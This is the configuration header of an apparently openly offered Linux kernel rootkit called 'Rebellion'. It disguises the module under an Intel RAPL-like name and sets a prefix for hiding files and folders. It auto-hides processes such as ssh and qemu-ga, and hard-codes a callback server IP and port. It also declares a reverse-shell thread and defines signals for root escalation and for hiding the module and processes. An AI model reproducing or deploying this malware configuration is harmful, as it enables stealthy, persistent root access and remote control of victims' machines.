/*
 ██▀███  ▓█████  ▄▄▄▄    ▄▄▄▄   ▓█████  ██▓     ██▓ ▒█████   ███▄    █ 
▓██ ▒ ██▒▓█   ▀ ▓█████▄ ▓█████▄ ▓█   ▀ ▓██▒    ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▓██ ░▄█ ▒▒███   ▒██▒ ▄██▒██▒ ▄██▒███   ▒██░    ▒██▒▒██░  ██▒▓██  ▀█ ██▒
▒██▀▀█▄  ▒▓█  ▄ ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██░    ░██░▒██   ██░▓██▒  ▐▌██▒
░██▓ ▒██▒░▒████▒░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██████▒░██░░ ████▓▒░▒██░   ▓██░
░ ▒▓ ░▒▓░░░ ▒░ ░░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒░▓  ░░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
  ░▒ ░ ▒░ ░ ░  ░▒░▒   ░ ▒░▒   ░  ░ ░  ░░ ░ ▒  ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░░   ░    ░    ░    ░  ░    ░    ░     ░ ░    ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░        ░  ░ ░       ░         ░  ░    ░  ░ ░      ░ ░           ░ 
                      ░       ░                                                                                                                                                      
*/
#ifndef CONFIG_H
#define CONFIG_H
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <net/sock.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/skbuff.h>

#include "hooks.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("br0sck");
MODULE_DESCRIPTION("Ring 0  for Linux Kernels x86/x86_64 5.x/6.x");

//=============[YOU CAN CHANGE THIS]========================//
#define MODULENAME "intel_rapl_headers"      // if you change the file name, you must change it here too
#define HIDE_PORT 1234              // 
#define MAGIC_PREFIX "intelheaders_"         // folder/file prefix to hide
#define HIDE_PROCESS_LIST_SIZE 10   // maximum number of process names to hide
#define MAX_PROCESS_NAME_LEN 256    // maximum length of process name/command
//==========[PROCESS HIDING]=========//
static char hidden_processes[HIDE_PROCESS_LIST_SIZE][MAX_PROCESS_NAME_LEN];
static int hidden_process_count = 0;
// Auto-hide processes
#define AUTO_HIDE_PROCESS "intel_gnu_header"
#define AUTO_HIDE_PROCESS2 "qemu-ga"
#define AUTO_HIDE_PROCESS3 "ssh"
//==========[AGENT EXECUTION]=========//
#define YOUR_SRV_IP "77.110.126.70"     // (kept for compatibility, not used in agent mode)
#define YOUR_SRV_PORT 1234          // (kept for compatibility, not used in agent mode)
//====================================//
#define SIGUSR1 10                  // Root privilege escalation
#define SIGUSR2 12                  // Module hide/show toggle
#define SIGRTMIN 34                 // Hide process (kill -34 0 PID_TO_HIDE)
#define SIGRTMIN1 35                // Unhide process (kill -35 0 PID_TO_UNHIDE)
#define SIGRTMIN2 36                // Clear all hidden processes (kill -36 0)
//==================================================================//

#define TRUE 1
#define FALSE 0

bool isModuleHidden = FALSE;
static struct list_head *modPrevious;
static struct list_head *modKOBJPrevious;

void hideModule(void);
void showModule(void);

// Process hiding functions
int add_hidden_process(const char *process_name);
int remove_hidden_process(const char *process_name);
bool is_process_hidden(const char *process_name);
bool is_pid_hidden_by_name(pid_t pid);
void clear_all_hidden_processes(void);

static struct task_struct *revshell_thread;
// static bool execute_shell = false; // Removed - no longer needed for automatic execution

#endif // !CONFIG_H
